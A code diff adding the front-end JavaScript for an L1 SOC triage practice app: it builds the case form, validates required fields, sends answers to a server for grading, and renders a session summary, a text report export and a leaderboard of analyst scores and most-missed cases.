+  formPanel.appendChild(buildField('Command Line','cmdline','textarea',r.cmdline));
+  formPanel.appendChild(buildField('What happened?','whatHappened','textarea',r.whatHappened));
+  formPanel.appendChild(buildField('Evidence reviewed','evidence','textarea',r.evidence));
+  formPanel.appendChild(buildField('Related events','related','textarea',r.related));
+  formPanel.appendChild(buildField('IOC findings','ioc','textarea',r.ioc));
+  formPanel.appendChild(buildField('Expected / benign explanation (if any)','benignExplain','textarea',r.benignExplain));
+
+  // Verdict fieldset
+  const vfs = el('fieldset'); vfs.id = 'fsVerdict';
+  const vleg = el('legend'); vleg.textContent = 'L1 Verdict *';
+  vfs.appendChild(vleg);
+  const vrow = el('div','opt-row');
+  VERDICTS.forEach(v=>{
+    const lbl = el('label');
+    const inp = el('input'); inp.type='radio'; inp.name='verdict'; inp.value=v;
+    if(r.verdict===v) inp.checked = true;
+    if(r.checked) inp.disabled = true;
+    inp.addEventListener('change', ()=>{ vfs.classList.remove('invalid'); });
+    lbl.appendChild(inp);
+    lbl.appendChild(document.createTextNode(v));
+    vrow.appendChild(lbl);
+  });
+  vfs.appendChild(vrow);
+  if(r.checked){
+    const ln = el('div','locked-note');
+    ln.textContent = 'Verdict locked \u2014 this case has been scored.';
+    vfs.appendChild(ln);
+  }
+  formPanel.appendChild(vfs);
+
+  // Severity + escalation row
+  const grid2b = el('div','grid2');
+  const sevField = el('div','field');
+  const sevLabel = el('label'); sevLabel.textContent='Severity assessment *';
+  const sevSelect = el('select'); sevSelect.id='severityAssess';
+  ['','Low','Medium','High','Critical'].forEach(opt=>{
+    const o = document.createElement('option'); o.value=opt; o.textContent = opt || 'Select severity';
+    if(r.severityAssess===opt) o.selected = true;
+    sevSelect.appendChild(o);
+  });
+  sevSelect.addEventListener('change', ()=>{ sevSelect.classList.remove('invalid'); });
+  sevField.appendChild(sevLabel); sevField.appendChild(sevSelect);
+  grid2b.appendChild(sevField);
+
+  const efs = el('fieldset'); efs.id = 'fsEscalate';
+  const eleg = el('legend'); eleg.textContent='Escalation Required *';
+  efs.appendChild(eleg);
+  const erow = el('div','opt-row');
+  ['No','Yes'].forEach(v=>{
+    const lbl = el('label');
+    const inp = el('input'); inp.type='radio'; inp.name='escalate'; inp.value=v;
+    if(r.escalate===v) inp.checked = true;
+    if(r.checked) inp.disabled = true;
+    inp.addEventListener('change', ()=>{ efs.classList.remove('invalid'); });
+    lbl.appendChild(inp);
+    lbl.appendChild(document.createTextNode(v));
+    erow.appendChild(lbl);
+  });
+  efs.appendChild(erow);
+  grid2b.appendChild(efs);
+  formPanel.appendChild(grid2b);
+
+  formPanel.appendChild(buildField('Reason *','reason','textarea',r.reason));
+  formPanel.appendChild(buildField('Recommended next action *','nextAction','textarea',r.nextAction));
+
+  // Answer key reveal area
+  const akWrap = el('div');
+  akWrap.id = 'answerArea';
+  if(r.checked){ akWrap.appendChild(buildAnswerKey(s,r)); }
+  formPanel.appendChild(akWrap);
+
+  // Validation feedback
+  const valBox = el('div','valmsg'); valBox.id = 'valMsg';
+  formPanel.appendChild(valBox);
+
+  // Buttons
+  const btnrow = el('div','btnrow');
+  const leftGroup = el('div','left-group');
+  const prevBtn = el('button'); prevBtn.textContent='\u2190 Previous'; prevBtn.disabled = idx===0;
+  prevBtn.addEventListener('click', ()=>{ saveCurrent(); idx=Math.max(0,idx-1); render(); });
+  leftGroup.appendChild(prevBtn);
+
+  if(!r.checked){
+    const checkBtn = el('button','primary'); checkBtn.textContent='Check answer & score';
+    checkBtn.addEventListener('click', async ()=>{
+      saveCurrent();
+      const rr = ensureResp(s.id);
+      const problems = validateCase(rr);
+      if(problems.length){ showValidation(problems); return; }
+      clearValidation();
+      checkBtn.disabled = true; checkBtn.textContent = 'Checking\u2026';
+      try{
+        const result = await gradeCase(s.id, rr);
+        rr.checked = true;
+        rr.correct = !!result.correct;
+        rr.key = {
+          expectedVerdict: result.expectedVerdict,
+          expectedEscalate: result.expectedEscalate,
+          rationale: result.rationale
+        };
+        persist();
+        render();
+      } catch(err){
+        checkBtn.disabled = false; checkBtn.textContent = 'Check answer & score';
+        showValidation([{field:'fsVerdict', type:'fieldset', msg:'Could not reach the scoreboard to grade this case (' + err.message + '). Your answer is not lost \u2014 check your connection and try again.'}]);
+      }
+    });
+    leftGroup.appendChild(checkBtn);
+  }
+  btnrow.appendChild(leftGroup);
+
+  const rightGroup = el('div','right-group');
+  const nextBtn = el('button','primary');
+  nextBtn.textContent = idx === SCENARIOS.length-1 ? 'Finish \u2192' : 'Next \u2192';
+  let skipArmed = false;
+  nextBtn.addEventListener('click', ()=>{
+    saveCurrent();
+    const rr = ensureResp(s.id);
+    if(!rr.checked && !skipArmed){
+      skipArmed = true;
+      nextBtn.textContent = 'Skip anyway \u2192';
+      nextBtn.classList.remove('primary');
+      showValidation([{field:'fsVerdict', type:'fieldset',
+        msg:'This case has not been scored, so it will count as zero. Complete the record and press "Check answer & score", or press Skip anyway to move on.'}]);
+      return;
+    }
+    if(idx === SCENARIOS.length-1){ renderSummary(); }
+    else { idx++; render(); }
+  });
+  rightGroup.appendChild(nextBtn);
+  btnrow.appendChild(rightGroup);
+
+  formPanel.appendChild(btnrow);
+  view.appendChild(formPanel);
+}
+
+/* Every field an L1 must commit to before a case can be scored. */
+const MIN_NOTE = 10;   // minimum characters for the written fields
+
+function validateCase(r){
+  const problems = [];
+  if(!r.verdict){
+    problems.push({field:'fsVerdict', type:'fieldset', msg:'Choose an L1 verdict.'});
+  }
+  if(!r.severityAssess){
+    problems.push({field:'severityAssess', type:'input', msg:'Select a severity assessment.'});
+  }
+  if(!r.escalate){
+    problems.push({field:'fsEscalate', type:'fieldset', msg:'Say whether escalation is required.'});
+  }
+  if(!r.reason || r.reason.trim().length < MIN_NOTE){
+    problems.push({field:'reason', type:'input', msg:'Give a reason for your verdict (at least ' + MIN_NOTE + ' characters).'});
+  }
+  if(!r.nextAction || r.nextAction.trim().length < MIN_NOTE){
+    problems.push({field:'nextAction', type:'input', msg:'State the recommended next action (at least ' + MIN_NOTE + ' characters).'});
+  }
+  return problems;
+}
+
+function clearValidation(){
+  const box = document.getElementById('valMsg');
+  if(box) box.innerHTML = '';
+  document.querySelectorAll('.invalid').forEach(n=>n.classList.remove('invalid'));
+}
+
+function showValidation(problems){
+  clearValidation();
+  const box = document.getElementById('valMsg');
+  if(box){
+    const head = document.createElement('div');
+    head.textContent = problems.length === 1
+      ? 'One field still needs completing before this case can be scored:'
+      : problems.length + ' fields still need completing before this case can be scored:';
+    box.appendChild(head);
+    const ul = document.createElement('ul');
+    problems.forEach(p=>{ const li = document.createElement('li'); li.textContent = p.msg; ul.appendChild(li); });
+    box.appendChild(ul);
+  }
+  problems.forEach(p=>{
+    const node = document.getElementById(p.field);
+    if(node) node.classList.add('invalid');
+  });
+  const first = document.getElementById(problems[0].field);
+  if(first){
+    first.scrollIntoView({block:'center', behavior:'smooth'});
+    if(problems[0].type === 'input' && first.focus) first.focus();
+    else { const radio = first.querySelector('input'); if(radio) radio.focus(); }
+  }
+}
+
+/* Grading is done by the scoreboard, so the answer key never reaches the
+   browser. Returns the server's reply or throws. */
+async function gradeCase(caseId, r){
+  const data = await srun('gradeCase', caseId, r.verdict, r.escalate);
+  if(!data || data.ok === false) throw new Error((data && data.error) || 'grading refused');
+  return data;   // {correct, expectedVerdict, expectedEscalate, rationale}
+}
+
+function buildAnswerKey(s,r){
+  const k = r.key || {};
+  const box = el('div','answerkey');
+  const line = el('div','verdict-line');
+  const p1 = el('span','pill neutral'); p1.textContent = 'Expected: ' + (k.expectedVerdict || '\u2014');
+  line.appendChild(p1);
+  const escText = k.expectedEscalate === 'conditional'
+    ? 'Escalation: depends (see rationale)'
+    : ('Escalation: ' + (k.expectedEscalate === true || k.expectedEscalate === 'Yes' ? 'Yes' : 'No'));
+  const p2 = el('span','pill neutral'); p2.textContent = escText;
+  line.appendChild(p2);
+  const p3 = el('span','pill ' + (r.correct ? 'correct' : 'incorrect'));
+  p3.textContent = r.correct ? 'Your verdict matched' : 'Your verdict differed';
+  line.appendChild(p3);
+  box.appendChild(line);
+  const rat = el('div'); rat.textContent = k.rationale || '';
+  box.appendChild(rat);
+  return box;
+}
+
+function renderSummary(){
+  document.getElementById('scenarioView').style.display = 'none';
+  document.getElementById('leaderboardView').style.display = 'none';
+  const view = document.getElementById('summaryView');
+  view.style.display = 'block';
+  view.innerHTML = '';
+  document.getElementById('caseCounter').textContent = 'Practice complete \u2014 ' + SCENARIOS.length + ' cases';
+  const checkedCount = Object.values(responses).filter(x=>x.checked).length;
+  const correctCount = Object.values(responses).filter(x=>x.checked && x.correct).length;
+  document.getElementById('scoreCounter').textContent = checkedCount ? ('Checked ' + checkedCount + ' \u00b7 ' + correctCount + ' correct') : '';
+  renderTicks();
+
+  const panel = el('div','panel');
+  const h = el('h2'); h.textContent = 'SESSION SUMMARY';
+  panel.appendChild(h);
+
+  const answeredCount = Object.values(responses).filter(x=>x.verdict).length;
+
+  const scorebox = el('div','scorebox');
+  const big = el('div','big'); big.textContent = correctCount + '/' + SCENARIOS.length;
+  const of = el('div','of');
+  of.textContent = Math.round((correctCount/SCENARIOS.length)*100) + '% \u00b7 ' + checkedCount + ' cases scored, ' + (SCENARIOS.length - checkedCount) + ' left unscored';
+  scorebox.appendChild(big); scorebox.appendChild(of);
+  panel.appendChild(scorebox);
+
+  const summaryLine = el('p');
+  summaryLine.style.margin = '0 0 4px';
+  summaryLine.style.fontSize = '13.5px';
+  summaryLine.style.color = 'var(--muted)';
+  summaryLine.textContent = answeredCount + ' of ' + SCENARIOS.length + ' cases were given a verdict. ' +
+    'A case only counts toward the score once you press "Check answer & score" on it.';
+  panel.appendChild(summaryLine);
+
+  const table = el('table','summary-table');
+  const thead = document.createElement('thead');
+  const hr = document.createElement('tr');
+  ['Case','Your verdict','Expected','Result'].forEach(h=>{ const th=document.createElement('th'); th.textContent=h; hr.appendChild(th); });
+  thead.appendChild(hr);
+  table.appendChild(thead);
+  const tbody = document.createElement('tbody');
+  SCENARIOS.forEach(s=>{
+    const r = responses[s.id] || {};
+    const tr = document.createElement('tr');
+    const c1 = document.createElement('td'); c1.textContent = s.id + ' \u2014 ' + s.title;
+    const c2 = document.createElement('td'); c2.textContent = r.verdict || '\u2014';
+    const c3 = document.createElement('td'); c3.textContent = (r.key && r.key.expectedVerdict) ? r.key.expectedVerdict : '\u2014';
+    const c4 = document.createElement('td');
+    c4.textContent = r.checked ? (r.correct ? 'Correct' : 'Differed') : 'Not checked';
+    tr.appendChild(c1);tr.appendChild(c2);tr.appendChild(c3);tr.appendChild(c4);
+    tbody.appendChild(tr);
+  });
+  table.appendChild(tbody);
+  panel.appendChild(table);
+
+  const btnrow = el('div','btnrow');
+  btnrow.style.marginTop = '16px';
+  const leftGroup = el('div','left-group');
+  const backBtn = el('button'); backBtn.textContent = '\u2190 Review cases';
+  backBtn.addEventListener('click', ()=>{ idx=0; render(); });
+  leftGroup.appendChild(backBtn);
+  if(SHOW_LEADERBOARD){
+    const lbBtn = el('button'); lbBtn.textContent = 'Leaderboard';
+    lbBtn.addEventListener('click', ()=>{ cameFrom='summary'; renderLeaderboard(); loadLeaderboard(); });
+    leftGroup.appendChild(lbBtn);
+  }
+  let resetArmed = false;
+  const restartBtn = el('button'); restartBtn.textContent = 'Start a new session';
+  restartBtn.addEventListener('click', ()=>{
+    if(!resetArmed){
+      resetArmed = true;
+      restartBtn.textContent = 'Confirm: clear all my answers';
+      restartBtn.style.borderColor = 'var(--crit)';
+      return;
+    }
+    srun('clearProgress').catch(()=>{});
+    Object.keys(responses).forEach(k=>delete responses[k]);
+    participant = null;
+    submitState = {status:'idle', message:''};
+    saveState = 'idle';
+    idx = 0;
+    render();
+  });
+  leftGroup.appendChild(restartBtn);
+  btnrow.appendChild(leftGroup);
+
+  const rightGroup = el('div','right-group');
+  const exportBtn = el('button'); exportBtn.textContent = 'Download my report';
+  exportBtn.addEventListener('click', exportReport);
+  rightGroup.appendChild(exportBtn);
+
+  {
+    const submitBtn = el('button','primary');
+    submitBtn.id = 'submitBtn';
+    submitBtn.textContent = submitState.status === 'sent' ? 'Results submitted' : 'Submit results';
+    submitBtn.disabled = submitState.status === 'sent' || submitState.status === 'sending';
+    submitBtn.addEventListener('click', submitResults);
+    rightGroup.appendChild(submitBtn);
+  }
+  btnrow.appendChild(rightGroup);
+  panel.appendChild(btnrow);
+
+  const state = el('div','submitstate');
+  state.id = 'submitState';
+  if(submitState.message){
+    state.textContent = submitState.message;
+    const cls = submitState.status === 'sent' ? 'ok' : (submitState.status === 'error' ? 'bad' : '');
+    if(cls) state.classList.add(cls);
+  } else {
+    state.style.color = 'var(--muted)';
+    state.textContent = 'Submitting records your final score against your signed-in account.';
+  }
+  panel.appendChild(state);
+
+  view.appendChild(panel);
+}
+
+function buildPayload(){
+  const checked = Object.values(responses).filter(x=>x.checked);
+  const correct = checked.filter(x=>x.correct).length;
+  const finishedAt = new Date().toISOString();
+  const started = participant.startedAt ? new Date(participant.startedAt) : null;
+  const minutes = started ? Math.round((new Date(finishedAt) - started)/60000) : null;
+  return {
+    sessionId: participant.sessionId,
+    name: participant.name,
+    email: participant.email || '',
+    listPublicly: !!participant.listPublicly,
+    startedAt: participant.startedAt,
+    finishedAt: finishedAt,
+    durationMinutes: minutes,
+    totalCases: SCENARIOS.length,
+    scoredCases: checked.length,
+    correct: correct,
+    scorePercent: Math.round((correct/SCENARIOS.length)*100),
+    userAgent: navigator.userAgent,
+    cases: SCENARIOS.map(s=>{
+      const r = responses[s.id] || {};
+      return {
+        id: s.id,
+        title: s.title,
+        verdict: r.verdict || '',
+        escalate: r.escalate || '',
+        severity: r.severityAssess || '',
+        scored: !!r.checked,
+        correct: r.checked ? !!r.correct : null,
+        whatHappened: r.whatHappened || '',
+        reason: r.reason || '',
+        nextAction: r.nextAction || ''
+      };
+    })
+  };
+}
+
+async function submitResults(){
+  if(!participant) return;
+  const payload = buildPayload();
+  submitState = {status:'sending', message:'Sending your results\u2026'};
+  try { renderSummary(); } catch(e){ console.warn('render during submit failed', e); }
+
+  try{
+    const data = await srun('submitResults', JSON.stringify(payload));
+    if(!data || data.ok === false) throw new Error((data && data.error) || 'rejected by scoreboard');
+    submitState = {status:'sent', message:'Results submitted. Final score as recorded by the server: '
+      + data.score + '/' + data.total + ' (' + data.percent + '%).'};
+    persist();
+    if(SHOW_LEADERBOARD){ board = {status:'idle', data:null, error:''}; }
+  } catch(err){
+    submitState = {status:'error', message:'Could not send results (' + err.message + '). Your answers are saved on the server \u2014 reopen this page and press Submit again.'};
+  }
+  renderSummary();
+}
+
+function exportReport(){
+  const checked = Object.values(responses).filter(x=>x.checked);
+  const correct = checked.filter(x=>x.correct).length;
+  let out = 'L1 SOC INVESTIGATION & TRIAGE PRACTICE - REPORT\n';
+  out += 'Generated: ' + new Date().toISOString() + '\n';
+  if(participant){
+    out += 'Display name: ' + participant.name + '\n';
+    out += 'Account: ' + (participant.email||'') + '\n';
+    out += 'Session ID: ' + participant.sessionId + '\n';
+    out += 'Started: ' + participant.startedAt + '\n';
+  }
+  out += 'Score: ' + correct + '/' + SCENARIOS.length + ' (' + Math.round((correct/SCENARIOS.length)*100) + '%), ' + checked.length + ' cases scored\n';
+  out += '='.repeat(60) + '\n\n';
+  SCENARIOS.forEach(s=>{
+    const r = responses[s.id] || {};
+    out += s.id + ' - ' + s.title + '\n';
+    out += '-'.repeat(60) + '\n';
+    out += 'Host: ' + (r.host||'') + '\n';
+    out += 'User: ' + (r.user||'') + '\n';
+    out += 'Process: ' + (r.process||'') + '\n';
+    out += 'Parent Process: ' + (r.parentProcess||'') + '\n';
+    out += 'Command Line: ' + (r.cmdline||'') + '\n';
+    out += 'Source IP: ' + (r.srcip||'') + '\n';
+    out += 'Destination IP: ' + (r.dstip||'') + '\n';
+    out += 'Destination Port: ' + (r.dstport||'') + '\n\n';
+    out += 'What happened?\n' + (r.whatHappened||'') + '\n\n';
+    out += 'Evidence reviewed:\n' + (r.evidence||'') + '\n\n';
+    out += 'Related events:\n' + (r.related||'') + '\n\n';
+    out += 'IOC findings:\n' + (r.ioc||'') + '\n\n';
+    out += 'Expected/benign explanation:\n' + (r.benignExplain||'') + '\n\n';
+    out += 'L1 Verdict: ' + (r.verdict||'(none)') + '\n';
+    out += 'Severity assessment: ' + (r.severityAssess||'') + '\n';
+    out += 'Escalation Required: ' + (r.escalate||'') + '\n';
+    out += 'Reason: ' + (r.reason||'') + '\n';
+    out += 'Recommended Next Action: ' + (r.nextAction||'') + '\n\n';
+    if(r.checked && r.key){
+      out += 'Expected classification: ' + (r.key.expectedVerdict||'') + '\n';
+      out += 'Result: ' + (r.correct ? 'Matched' : 'Differed') + '\n';
+      out += 'Rationale: ' + (r.key.rationale||'') + '\n';
+    }
+    out += '\n' + '='.repeat(60) + '\n\n';
+  });
+  showReportPanel(out);
+}
+
+/* Downloads are unreliable inside the HtmlService iframe, so the report is
+   shown for copying, with a download attempt offered as well. */
+function showReportPanel(text){
+  const view = document.getElementById('summaryView');
+  let box = document.getElementById('reportBox');
+  if(box) box.remove();
+  box = el('div','panel'); box.id = 'reportBox';
+  const h2 = el('h2'); h2.textContent = 'YOUR TRIAGE REPORT';
+  box.appendChild(h2);
+  const ta = document.createElement('textarea');
+  ta.value = text; ta.readOnly = true; ta.id = 'reportText';
+  ta.style.width = '100%'; ta.style.height = '260px';
+  ta.style.background = 'var(--panel-2)'; ta.style.color = 'var(--text)';
+  ta.style.border = '1px solid var(--line)'; ta.style.borderRadius = '4px';
+  ta.style.fontFamily = 'var(--mono)'; ta.style.fontSize = '12px'; ta.style.padding = '10px';
+  box.appendChild(ta);
+  const row = el('div','btnrow');
+  const left = el('div','left-group');
+  const copyBtn = el('button','primary'); copyBtn.textContent = 'Copy to clipboard';
+  copyBtn.addEventListener('click', ()=>{
+    ta.select();
+    let ok = false;
+    try { ok = document.execCommand('copy'); } catch(e){ ok = false; }
+    copyBtn.textContent = ok ? 'Copied' : 'Press Ctrl+C to copy';
+  });
+  left.appendChild(copyBtn);
+  const dlBtn = el('button'); dlBtn.textContent = 'Try download';
+  dlBtn.addEventListener('click', ()=>{
+    try{
+      const blob = new Blob([text], {type:'text/plain'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url; a.download = 'l1-triage-' + (participant ? participant.sessionId : 'report') + '.txt';
+      document.body.appendChild(a); a.click(); document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    } catch(e){ dlBtn.textContent = 'Download blocked \u2014 copy instead'; }
+  });
+  left.appendChild(dlBtn);
+  const closeBtn = el('button'); closeBtn.textContent = 'Close';
+  closeBtn.addEventListener('click', ()=> box.remove());
+  left.appendChild(closeBtn);
+  row.appendChild(left); row.appendChild(el('div','right-group'));
+  box.appendChild(row);
+  view.appendChild(box);
+  ta.scrollIntoView({block:'nearest', behavior:'smooth'});
+}
+
+/* ======================= PUBLIC LEADERBOARD ======================= */
+
+function loadLeaderboard(force){
+  if(!SHOW_LEADERBOARD) return;
+  if(board.status === 'loading') return;
+  if(board.status === 'ready' && !force) return;
+  board = {status:'loading', data:null, error:''};
+  renderLeaderboard();
+
+  srun('getLeaderboard')
+    .then(data => { board = {status:'ready', data:data, error:''}; renderLeaderboard(); })
+    .catch(err => { board = {status:'error', data:null, error:'Could not load the leaderboard (' + err.message + ').'}; renderLeaderboard(); });
+}
+
+function fmtMinutes(m){
+  if(m === null || m === undefined || m === '') return '\u2014';
+  return m < 60 ? (m + 'm') : (Math.floor(m/60) + 'h ' + (m%60) + 'm');
+}
+
+function renderLeaderboard(){
+  document.getElementById('registerView').style.display = 'none';
+  document.getElementById('scenarioView').style.display = 'none';
+  document.getElementById('summaryView').style.display = 'none';
+  document.getElementById('topHeader').style.display = participant ? 'block' : 'none';
+  const view = document.getElementById('leaderboardView');
+  view.style.display = 'block';
+  view.innerHTML = '';
+
+  const panel = el('div','panel');
+  const h = el('h2'); h.textContent = 'LEADERBOARD';
+  panel.appendChild(h);
+
+  if(board.status === 'loading'){
+    const p = el('p','empty'); p.textContent = 'Loading scores\u2026';
+    panel.appendChild(p);
+  } else if(board.status === 'error'){
+    const p = el('p','empty'); p.textContent = board.error;
+    panel.appendChild(p);
+  } else if(board.status === 'ready'){
+    const d = board.data || {};
+    const entries = d.entries || [];
+
+    const stats = el('div','stats');
+    [[d.participants || 0,'analysts completed'],
+     [(d.averagePercent || 0) + '%','average score'],
+     [entries.length ? (entries[0].score + '/' + entries[0].total) : '\u2014','top score']
+    ].forEach(([n,l])=>{
+      const s = el('div','stat');
+      const nn = el('div','n'); nn.textContent = n;
+      const ll = el('div','l'); ll.textContent = l;
+      s.appendChild(nn); s.appendChild(ll); stats.appendChild(s);
+    });
+    panel.appendChild(stats);
+
+    if(!entries.length){
+      const p = el('p','empty');
+      p.textContent = 'No scores posted yet. Finish the practice and submit your results to open the board.';
+      panel.appendChild(p);
+    } else {
+      const table = el('table','lb');
+      const thead = document.createElement('thead');
+      const hr = document.createElement('tr');
+      ['#','Analyst','Score','Accuracy','Time'].forEach(t=>{
+        const th = document.createElement('th'); th.textContent = t; hr.appendChild(th);
+      });
+      thead.appendChild(hr); table.appendChild(thead);
+      const tb = document.createElement('tbody');
+      entries.forEach(en=>{
+        const tr = document.createElement('tr');
+        if(participant && en.sessionId === participant.sessionId) tr.classList.add('you');
+        if(en.rank <= 3) tr.classList.add('top');
+        const c1 = document.createElement('td'); c1.className='rank'; c1.textContent = en.rank;
+        const c2 = document.createElement('td');
+        c2.textContent = en.name + ((participant && en.sessionId === participant.sessionId) ? '  (you)' : '');
+        const c4 = document.createElement('td'); c4.className='num'; c4.textContent = en.score + '/' + en.total;
+        const c5 = document.createElement('td');
+        const bar = el('div','bar'); const fill = document.createElement('span');
+        fill.style.width = Math.max(2, en.percent) + '%'; bar.appendChild(fill);
+        c5.appendChild(bar);
+        const c6 = document.createElement('td'); c6.className='num'; c6.textContent = fmtMinutes(en.minutes);
+        [c1,c2,c4,c5,c6].forEach(c=>tr.appendChild(c));
+        tb.appendChild(tr);
+      });
+      table.appendChild(tb);
+      panel.appendChild(table);
+
+      const foot = el('p','lb-foot');
+      foot.textContent = 'Ranked by score, then by completion time. Analysts who opted out are counted in the totals but not listed. Refreshes about once a minute.';
+      panel.appendChild(foot);
+    }
+
+    // Which cases the group gets wrong most often. Cases nobody has missed are
+    // not "most-missed", and a single attempt is not evidence of difficulty.
+    const cs = (d.caseStats || [])
+      .filter(c => c.attempts >= MISSED_MIN_ATTEMPTS && c.percent < 100)
+      .slice(0,6);
+    if(cs.length){
+      const h2 = el('h2'); h2.style.marginTop = '24px';
+      h2.textContent = 'MOST-MISSED CASES';
+      panel.appendChild(h2);
+      const t2 = el('table','lb');
+      const th2 = document.createElement('thead');
+      const hr2 = document.createElement('tr');
+      ['Alert','Case','Correct rate','Scored by'].forEach(t=>{
+        const th = document.createElement('th'); th.textContent = t; hr2.appendChild(th);
+      });
+      th2.appendChild(hr2); t2.appendChild(th2);
+      const tb2 = document.createElement('tbody');
+      cs.forEach(c=>{
+        const tr = document.createElement('tr');
+        const a = document.createElement('td'); a.className='num'; a.textContent = c.id;
+        const b = document.createElement('td'); b.textContent = c.title;
+        const cc = document.createElement('td');
+        const bar = el('div','bar'); if(c.percent < 60) bar.classList.add('hard');
+        const fill = document.createElement('span'); fill.style.width = Math.max(2,c.percent) + '%';
+        bar.appendChild(fill);
+        const pct = el('span'); pct.style.fontSize='11.5px'; pct.style.color='var(--muted)';
+        pct.textContent = ' ' + c.percent + '%';
+        cc.appendChild(bar); cc.appendChild(pct);
+        const dd = document.createElement('td'); dd.className='num'; dd.textContent = c.attempts;
+        [a,b,cc,dd].forEach(x=>tr.appendChild(x));
+        tb2.appendChild(tr);
+      });
+      t2.appendChild(tb2);
+      panel.appendChild(t2);
+
+      const foot2 = el('p','lb-foot');
+      foot2.textContent = 'Cases every analyst got right are not listed. A case appears once at least '
+        + MISSED_MIN_ATTEMPTS + ' analysts have scored it.';
+      panel.appendChild(foot2);
+    }
+  }
+
+  const btnrow = el('div','btnrow');
+  const left = el('div','left-group');
+  const backBtn = el('button');
+  backBtn.textContent = cameFrom === 'summary' ? '\u2190 Back to my results' : '\u2190 Back to sign-in';
+  backBtn.addEventListener('click', ()=>{
+    document.getElementById('leaderboardView').style.display = 'none';
+    if(cameFrom === 'summary'){ renderSummary(); }
+    else { renderRegister(); }
+  });
+  left.appendChild(backBtn);
+  const refreshBtn = el('button'); refreshBtn.textContent = 'Refresh';
+  refreshBtn.addEventListener('click', ()=> loadLeaderboard(true));
+  left.appendChild(refreshBtn);
+  btnrow.appendChild(left);
+  btnrow.appendChild(el('div','right-group'));
+  panel.appendChild(btnrow);
+
+  view.appendChild(panel);
+}
+
+function render(){
+  if(!participant){ renderRegister(); return; }
+  document.getElementById('registerView').style.display = 'none';
+  document.getElementById('leaderboardView').style.display = 'none';
+  document.getElementById('topHeader').style.display = 'block';
+  renderWhoami();
+  if(idx >= SCENARIOS.length){ renderSummary(); return; }
+  renderScenario();
+  persist();
+}
+
+bootstrap();
+</script>
+</body>
+</html>
